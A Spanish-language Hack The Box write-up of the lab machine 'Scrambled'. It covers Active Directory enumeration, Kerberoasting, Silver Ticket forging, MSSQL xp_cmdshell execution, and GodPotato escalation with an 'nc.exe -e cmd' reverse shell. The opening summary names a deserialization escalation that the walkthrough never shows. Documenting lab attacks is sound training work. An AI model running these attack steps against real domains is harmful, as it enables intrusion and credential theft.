---
title: Scrambled - HTB
date: 2026-05-16
mermaid: true
categories: [HackTheBox, Windows, Medium]
tags: [ActiveDirectory, KerberosAuth, SilverTicketAttack, Web, UserAsPass, Fuzzing, Kerberoasting, UserEnum, MSSQL, SeImpersonatePrivilege, GodPotato, nc]
---

Scrambled es una máquina de Hack The Box (Windows, dificultad Media) centrada en un entorno de Active Directory donde el protocolo NTLM está completamente deshabilitado, forzando el uso exclusivo de Kerberos. El acceso inicial se logra tras enumerar la web corporativa, obtener credenciales del usuario ksimpson y realizar un ataque de Kerberoasting contra la cuenta SqlSvc. Al no poder iniciar sesión de forma convencional, la intrusión requiere forjar un Silver Ticket para comprometer el servicio MSSQL y ganar una consola remota. Finalmente, la escalada de privilegios a SYSTEM se realiza mediante ingeniería inversa de un binario .NET personalizado, explotando una vulnerabilidad de deserialización insegura con BinaryFormatter.

# Reconocimiento Inicial
**En esta seccion hago un ping para ver el ttl y si tenemos conexion a la maquina.**

Empiezo haciendo un `ping` para enviar un paquete ICMP a la victima, de esta forma podemos hacernos una idea de su sistema operativo y también si tenemos conexión a ella

```bash
ping -c1 10.129.37.73

PING 10.129.37.73 (10.129.37.73) 56(84) bytes of data.
64 bytes from 10.129.37.73: icmp_seq=1 ttl=127 time=75.0 ms

--- 10.129.37.73 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 75.041/75.041/75.041/0.000 ms
```

Vemos que hemos recibido el paquete de vuelta, esto quiere decir que tenemos conexión a la maquina, y también vemos un `TTL (Time To Live)` de **127** así que podemos asumir que estamos ante una maquina **Windows**.

# Enumeración
**En esta parte aparecen los escaneos de nmap, la busqueda del codename, vulnerabilidades para las versiones de los servicios expuestos y añadir el virtualhosting en caso de que halla**

Ahora que ya sabemos a que nos enfrentamos vamos a enumerar que puertos están abiertos con nmap.

```bash
> rustscan --addresses "$IP" --ulimit 5000

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.37.73:53
Open 10.129.37.73:80
Open 10.129.37.73:88
Open 10.129.37.73:135
Open 10.129.37.73:139
Open 10.129.37.73:389
Open 10.129.37.73:445
Open 10.129.37.73:464
Open 10.129.37.73:593
Open 10.129.37.73:636
Open 10.129.37.73:1433
Open 10.129.37.73:3268
Open 10.129.37.73:3269
Open 10.129.37.73:4411
Open 10.129.37.73:5985
Open 10.129.37.73:9389
Open 10.129.37.73:49673
Open 10.129.37.73:49667
Open 10.129.37.73:49674
Open 10.129.37.73:49698
Open 10.129.37.73:49706
```

Hago un segundo escaneo para enumerar versiones de los servicios de dichos puertos abiertos con los scripts de enumeración de nmap

```bash
> nmap -p53,80,88,139,135,389,445,464,593,636,4411,1433,3268,3269,5985,9389,49667,49673,49674,49701,49708 -sCV --min-rate 5000 -Pn -n -oN target 10.129.37.73

Host is up (0.20s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-15 17:55:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-05-15T17:58:56+00:00; -1s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-05-15T17:58:56+00:00; -1s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-05-15T17:50:53
|_Not valid after:  2056-05-15T17:50:53
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2026-05-15T17:58:56+00:00; -1s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-05-15T17:58:56+00:00; -1s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2026-05-15T17:58:56+00:00; -1s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.93%I=7%D=5/15%Time=6A075E22%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDER
SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLEC
SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
SF:WN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TLS
SF:SessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1\
SF:.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(FourO
SF:hFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
SF:;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
SF:COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%
SF:r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDesk
SF:-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECOR
SF:P_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-05-15T17:58:17
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 15 18:59:00 2026 -- 1 IP address (1 host up) scanned in 200.89 seconds
```

# Fingerprinting
**Aqui busco dentro de esos puertos toda la informacion que pueda, sea fuzzing, enumeracion de subdominios, enumeracion de tecnologias**

### Web Analysis
En el escaneo de nmap veremos el FQD, asi que ya nos podemos hacer una idea de el dominio principal, aprovechando esto, lo meteremos en nuestro **/etc/hosts**

```bash
> echo "10.129.37.73 scrm.local dc1.scrm.local dc.srcm.local dc01.scrm.local" | sudo tee -a /etc/hosts
```
ahora que ya tenemos todos los dominios metidos en el **/etc/hosts**, vamos a revisar la pagina web, pero antes empiezo utilizando whatweb para ver las tecnologías que utiliza.

```
> whatweb -v http://scrm.local

WhatWeb report for http://scrm.local
Status    : 200 OK
Title     : Scramble Corp Intranet
IP        : 10.129.37.73
Country   : RESERVED, ZZ

Summary   : HTML5, HTTPServer[Microsoft-IIS/10.0], JQuery, Microsoft-IIS[10.0], Script

Detected Plugins:
[ HTML5 ]
	HTML version 5, detected by the doctype declaration


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	String       : Microsoft-IIS/10.0 (from server string)

[ JQuery ]
	A fast, concise, JavaScript that simplifies how to traverse
	HTML documents, handle events, perform animations, and add
	AJAX.

	Website     : http://jquery.com/

[ Microsoft-IIS ]
	Microsoft Internet Information Services (IIS) for Windows
	Server is a flexible, secure and easy-to-manage Web server
	for hosting anything on the Web. From media streaming to
	web application hosting, IIS scalable and open
	architecture is ready to handle the most demanding tasks.

	Version      : 10.0
	Website     : http://www.iis.net/

[ Script ]
	This plugin detects instances of script HTML elements and
	returns the script language/type.


HTTP Headers:
	HTTP/1.1 200 OK
	Content-Type: text/html
	Last-Modified: Thu, 04 Nov 2021 18:13:14 GMT
	Accept-Ranges: bytes
	ETag: "3aed29a2a7d1d71:0"
	Server: Microsoft-IIS/10.0
	Date: Fri, 15 May 2026 21:05:01 GMT
	Connection: close
	Content-Length: 2313
```

> **IIS 10.0** (Internet Information Services 10.0) es un **servidor web flexible, seguro y administrable** desarrollado por Microsoft. Viene integrado en las versiones modernas de Windows (como Windows 10, Windows 11, Windows Server 2016, 2019, 2022 y 2025).

En el reporte de whatweb veremos que nos enfrentamos a un **IIS 10.0 (No vulnerable)**, como no veo nada mas interesante para explotar por alguna version desactualizada, visitare el dominio para ver su contenido

![](/assets/images/htb/Scrambled/1.png)
No veo nada interesante a simplevista, asi que utilizo feroxbuster para hacer una busqueda de archivos (Fuzzing)

> El **Fuzzing** (o _fuzz testing_) es una tecnica que consiste en "bombardear" a un programa con una enorme cantidad de datos de entrada aleatorios, inválidos, inesperados o malformados (llamados _fuzz_) para ver si se rompe, se congela o se comporta de manera extraña. (En este caso lo utilizamos para buscar archivos validos)

```bash
> feroxbuster -u http://scrm.local:80/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt -t 64

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://scrm.local:80/
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      148c http://scrm.local/images => http://scrm.local/images/
200      GET        2l       23w      831c http://scrm.local/assets/js/jquery.scrolly.min.js
200      GET       18l       45w      339c http://scrm.local/assets/css/noscript.css
200      GET      123l      271w     2750c http://scrm.local/assets/js/main.js
200      GET        2l       37w     2257c http://scrm.local/assets/js/jquery.scrollex.min.js
200      GET        2l       87w     2439c http://scrm.local/assets/js/breakpoints.min.js
200      GET       89l      188w     2204c http://scrm.local/support.html
200      GET      587l     1232w    12433c http://scrm.local/assets/js/util.js
200      GET        2l       51w     1851c http://scrm.local/assets/js/browser.min.js
200      GET       84l      156w     2313c http://scrm.local/index.html
200      GET        2l     1276w    88145c http://scrm.local/assets/js/jquery.min.js
200      GET     3801l     7165w    64149c http://scrm.local/assets/css/main.css
200      GET       84l      156w     2313c http://scrm.local/
200      GET       90l      207w     2476c http://scrm.local/supportrequest.html
200      GET       61l      146w     1668c http://scrm.local/passwords.html
200      GET       79l      220w     2340c http://scrm.local/salesorders.html
200      GET      107l      217w     2888c http://scrm.local/newuser.html
301      GET        2l       10w      159c http://scrm.local/assets/css/images => http://scrm.local/assets/css/images/
403      GET       29l       92w     1233c http://scrm.local/assets/css/
403      GET       29l       92w     1233c http://scrm.local/assets/
403      GET       29l       92w     1233c http://scrm.local/assets/js/
301      GET        2l       10w      148c http://scrm.local/Images => http://scrm.local/Images/
301      GET        2l       10w      159c http://scrm.local/assets/css/Images => http://scrm.local/assets/css/Images/
301      GET        2l       10w      148c http://scrm.local/assets => http://scrm.local/assets/
```
En este reporte veremos algunos endpoints que pueden llegar a ser interesantes asi que vamos a investigarlos.

Cuando visitamos `/supportrequest.html` podemos encontrar una pequeña guia para poder contactar con el soporte IT, en este aparece una captura de pantalla el cual muestra lo que parece ser un posible usuario

![](/assets/images/htb/Scrambled/2.png)
Guardaremos a este usuario en un archivo para mas tarde, seguiremos investigando la web.

Visito otro endpoint interesante seria `/support.html` donde veremos una alerta confirmandonos que la autenticacion NTLM esta deshabilitada debido a una brecha de seguridad del mes pasado.

![](/assets/images/htb/Scrambled/3.png)

Esto nos hace deducir que la authenticacion de toda la maquina sera por kerberos y no por NTLM.
### Web Analysis (Extra)
**Las Partes extras de este write up son irrelevantes, ya que se muestra contenido de relleno que no tiene que ver con el desarrollo del CTF.**

Siguiendo con otros endpoints, veremos uno como `/passwords.html` este parece ser interesante pero simplemente veremos una explicacion del sistema de reset password que la empresa emplea

![](/assets/images/htb/Scrambled/4.png)

"Nuestro sistema de restablecimiento de contraseñas de autoservicio estará en funcionamiento pronto, pero mientras tanto llame a la línea de soporte de TI y restableceremos su contraseña. Si no hay nadie disponible, por favor deje un mensaje indicando su nombre de usuario y restableceremos su contraseña para que sea la misma que el nombre de usuario."

por ultimo, `/newuser.html` es un panel para crear una cuenta del un nuevo empleado pero no es funcional.

# Foothold
Antes de probar diferentes ataques con el usuario `ksimpson`, vamos a ver si podemos interactuar con diferentes servicios de forma anonima o invitada.

```bash
# Failed
> nxc smb 10.129.37.73 -u '' -p '' # Usuario anonimo

SMB         10.129.37.73    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.37.73    445    DC1              [-] scrm.local\: STATUS_NOT_SUPPORTED

# Failed
> nxc smb 10.129.37.73 -u 'Guest' -p '' # Usuario invitado

SMB         10.129.37.73    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.37.73    445    DC1              [-] scrm.local\Guest: STATUS_NOT_SUPPORTED
```

no funciona ninguno de las 2 tecnicas asi que, por metodologia empiezo comprobando si el usuario `ksimpson` utiliza el mismo nombre de usuario que de contraseña, añadiendo tambien la opcion `-k` para asegurarnos de que estamos autenticandonos con kerberos y no con NTLM

```bash
>nxc smb 10.129.37.73 -u 'ksimpson' -p 'ksimpson' -k

SMB         10.129.37.73    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.37.73    445    DC1              [+] scrm.local\ksimpson:ksimpson
```

vemos que las credenciales `ksimpson:ksimpson` son validas, esto nos abre muchas mas puertas para proximos ataques, pero, antes de realizar cualquier ataque por kerberos vamos a crear un archivo de configuracion que guardaremos en una variable de entorno.

```bash
nxc smb 10.129.37.73 --generate-krb5-file content/krb5.conf
```

> El archivo `krb5.conf` es el archivo de configuración central que utiliza el protocolo **Kerberos** en sistemas basados en Linux/Unix.
> 
> Este archivo le dice a tu sistema:
>
>1. **El nombre del Dominio (Realm):** Por ejemplo, `CORP.LOCAL`.
>
>2. **El Centro de Distribución de Claves (KDC):** Qué máquina (IP o nombre de host) maneja las contraseñas y los tickets de Kerberos (en este caso, la IP `10.129.37.73`).

Ahora para que herramientas de impacket usen el archivo que acabamos de generar lo tendremos que guardar en una variable de entorno

```bash
export KRB5_CONFIG=$(pwd)/content/krb5.conf
```

Ahora que ya lo tenemos exportado, y que sabemos que son credenciales validas, podremos ver recursos compartidos podemos ver con el usuario `ksimpson`

```bash
> nxc smb 10.129.37.73 -u 'ksimpson' -p 'ksimpson' -k --shares

SMB         10.129.37.73    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.37.73    445    DC1              [+] scrm.local\ksimpson:ksimpson
SMB         10.129.37.73    445    DC1              [*] Enumerated shares
SMB         10.129.37.73    445    DC1              Share           Permissions     Remark
SMB         10.129.37.73    445    DC1              -----           -----------     ------
SMB         10.129.37.73    445    DC1              ADMIN$                          Remote Admin
SMB         10.129.37.73    445    DC1              C$                              Default share
SMB         10.129.37.73    445    DC1              HR
SMB         10.129.37.73    445    DC1              IPC$            READ            Remote IPC
SMB         10.129.37.73    445    DC1              IT
SMB         10.129.37.73    445    DC1              NETLOGON        READ            Logon server share
SMB         10.129.37.73    445    DC1              Public          READ
SMB         10.129.37.73    445    DC1              Sales
SMB         10.129.37.73    445    DC1              SYSVOL          READ            Logon server share
```

Teniendo el recurso compartido `IPC$` podemos enumerar usuarios de forma rapida, con netexec/crackmapexec

>La funcion de IPC$ es puramente técnica: actúa como un "puente" o un canal de comunicación para que **dos computadoras compartan información y ejecuten comandos de forma remota**. Utiliza el protocolo SMB y un mecanismo llamado _Named Pipes_ (Tuberías con nombre) para permitir que los programas se hablen entre sí a través de la red.

```bash
> nxc smb 10.129.37.73 -u 'ksimpson' -p 'ksimpson' -k --rid-brute | grep -oP 'SCRM\\\K[^ ]+(?=\s+\(SidTypeUser\))' | tee users

administrator
Guest
krbtgt
DC1$
tstar
asmith
sjenkins
sdonington
WS01$
backupsvc
jhall
rsmith
ehooker
khicks
sqlsvc
miscsvc
ksimpson
```

ya tenemos una lista de usuarios, lo siguiente que probe fue hacer una tecnica llamada UserAsPass, esta tecnica nos sirve para saber si los usuarios encontrados tienen la misma contraseña que nombre de usuario

```bash
> nxc smb 10.129.37.73 -u users -p users --no-bruteforce -k --continue-on-success

SMB         10.129.37.73    445    DC1              [*]  x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.37.73    445    DC1              [-] scrm.local\administrator:administrator KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\Guest:Guest KDC_ERR_CLIENT_REVOKED
SMB         10.129.37.73    445    DC1              [-] scrm.local\krbtgt:krbtgt KDC_ERR_CLIENT_REVOKED
SMB         10.129.37.73    445    DC1              [-] scrm.local\DC1$:DC1$ KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\tstar:tstar KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\asmith:asmith KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\sjenkins:sjenkins KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\sdonington:sdonington KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\WS01$:WS01$ KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\backupsvc:backupsvc KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\jhall:jhall KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\rsmith:rsmith KDC_ERR_CLIENT_REVOKED
SMB         10.129.37.73    445    DC1              [-] scrm.local\ehooker:ehooker KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\khicks:khicks KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\sqlsvc:sqlsvc KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [-] scrm.local\miscsvc:miscsvc KDC_ERR_PREAUTH_FAILED
SMB         10.129.37.73    445    DC1              [+] scrm.local\ksimpson:ksimpson
```

Solo nos devuelve como valido el usuario que ya teniamos, ksimpson, siguiendo con otros ataques voy a pedir un ticket TGT como el usuario ksimpson, gracias a este TGT, no vamos a tener que indicar contraseña en herramientas como impacket

>Un **Ticket Granting Ticket (TGT)** es un ticket de autenticación usado en el protocolo **Kerberos.** Cuando un usuario se autentica correctamente ante el Servicio de Autenticación (AS), recibe este ticket. El TGT permite al usuario solicitar tickets de servicio adicionales sin tener que volver a ingresar sus credenciales, durante la vigencia del TGT (generalmente varias horas).

```bash
> getTGT.py -dc-ip "10.129.37.73" "scrm.local"/"ksimpson":"ksimpson"

Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ksimpson.ccache
```

Una vez tengamos el TGT guardado vamos a exportarlo para que herramientas como impacket puedan utilizarlo.

```bash
export KRB5CCNAME="$(pwd)/ksimpson.ccache"
```

Ya lo tenemos exportado, y con eso, todos los requisitos para hacer un ataque kerberoasting con authenticacion kerberos con la herramienta impacket.

```bash
> GetUserSPNs.py -k -no-pass scrm.local/ksimpson@dc1.scrm.local -dc-host dc1.scrm.local -request

$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm....<SNIP>....c8a58a3f3bf58594f3
```

> Un usuario es vulnerable a Kerberoasting porque tiene un **SPN (Service Principal Name)** asociado a su cuenta. Cuando cualquier usuario del dominio solicita un ticket de servicio (TGS) para ese SPN, el Controlador de Dominio lo entrega cifrado con la **clave NTLM** de la cuenta que posee el SPN (no con la clave del solicitante). Ese ticket puede ser capturado y crackeado offline para obtener la contraseña, sin importar si el solicitante tenía o no permiso para usar el servicio.

Gracias a este ataque obtuvimos un TGS, vamos a crackearlo con hashcat y asi obtener las credenciales del usuario `sqlsvc` (recomiendo añadir el hash en un archivo para que hashcat lo pueda crackear)

```bash
> hashcat hash /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm....<SNIP>....c8a58a3f3bf58594f3:Pegasus60
```

Con la contraseña del usuario `sqlsvc` vamos a ver pedir otro TGT con la herramienta `getTGT.py` para poder autenticarnos con el usuario que acabamos de encontrar

```bash
> getTGT.py -dc-ip "10.129.37.73" "scrm.local"/"sqlsvc":"Pegasus60"

> export KRB5CCNAME="$(pwd)/sqlsvc.ccache" 
```

# Escalada de privilegios
Teniendo ya un usuario vamos a saber para que nos sirve, intentando utilizar nxc al servicio mssql vemos un error bastante grande, este error nos puede indicar que vamos a tenet que hacer un ataque silver ticket para poder conectarnos al servicio mssql

>Silver Ticket attack es un ataque de **forjado de tickets Kerberos** que te permite acceder a un **servicio específico** (como MSSQL, HTTP, CIFS) en un servidor concreto, **sin necesidad de comunicarte con el Controlador de Dominio (DC)**.

Para este ataque necesitaremos el SID de dominio y tambien necesitaremos el HASH NT de nuestro usuario actual (sqlsvc), empezando por el el hash nt podemos forjar uno con el siguiente oneliner

```bash
export NT_HASH=$(printf '%s' 'Pegasus60'| iconv -t utf16le | openssl md4 | awk '{print $NF}')
```

Y ya tendremos guardada en una variable de entorno el hash nt, ahora nos falta el SID de dominio, este SID lo podremos sacar con bloodhound o lookupsid.py.

![](/assets/images/htb/Scrambled/5.png)

Copiaremos este SID para nuestro ataque silver ticket y con esto ya esta todo preparado para efectuar el ataque

```bash
> ticketer.py -nthash "$NT_HASH" -spn HOST/"dc1.scrm.local" -domain-sid "S-1-5-21-2743207045-1827831105-2542523200" -domain "scrm.local" sqlsvc

Impacket v0.13.0.dev0+20250717.182627.84ebce48 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/sqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in sqlsvc.ccache
```

Ya hemos forjado nuestro TGS nuevamente asi que vamos a exportarlo y a probar si podemos conectarnos por mssql

```bash
> export KRB5CCNAME="$(pwd)/sqlsvc.ccache"

> mssqlclient.py dc1.scrm.local -k -no-pass
```

Estamos dentro de la base de datos MSSQL, si nos fijamos bien, somos administrator, lo que significa que podemos ejecutar comandos a nivel de sistema.

```bash
> enable_xp_cmdshell  #Activamos la opcion de ejecucion de comandos
> EXEC xp_cmdshell 'whoami'; # comprobamos que podemos ejecutar comandos
```

Ahora que podemos ejecutar comandos a nivel de sistema vamos a subir una revshell para poder manejar mejor nuestro RCE, en mi caso, voy a utilizar una shell de revshells.com.

![](/assets/images/htb/Scrambled/6.png)

ya tenemos shell, ahora vamos a inspeccionar nuestros privilegios para ver si podemos abusar de alguno

```powershell
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Veremos un SeImpersonatePrivilege, asi que podemos utilizar GodPotato para abusar de el.

(Tenemos que subir GodPotato y nc a la victima)
```bash
.\GodPotato-NET4.exe -cmd "cmd /c C:\ProgramData\nc.exe -e cmd <ip> <port>"
```

nos podremos en escucha por el puerto que hallamos indicado con nuestra IP local y ya seremos administrator.

Happy Hacking!!